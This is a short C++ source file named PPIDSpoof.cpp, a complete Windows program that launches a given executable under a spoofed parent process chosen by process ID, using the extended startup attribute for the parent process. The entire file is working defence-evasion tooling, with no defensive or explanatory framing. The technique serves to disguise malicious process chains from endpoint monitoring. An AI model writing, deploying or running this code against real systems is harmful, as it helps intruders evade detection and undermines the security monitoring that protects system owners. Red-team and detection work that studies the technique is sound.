// PPIDSpoof.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <cstring>

using std::cout;
using std::endl;

int main(int argc, char** argv)
{

	if (argc < 3) {
		cout << "Bad arguments!" << endl;
		exit(1);
	}

	DWORD ppid = atoi(argv[1]);
	char* exePath = argv[2];

	cout << "Got PPID of " << ppid << endl;
	cout << "Got exe path of " << exePath << endl;

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));

	HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, ppid);
	if (!parentProcessHandle) {
		cout << "Failed to get handle to target process! Do you have permission? " << endl;
		exit(2);
	}

	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	BOOL success = CreateProcessA(NULL, exePath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
	if (!success) {
		cout << "Failed to create process!" << endl;
		exit(3);
	}

	return 0;
}
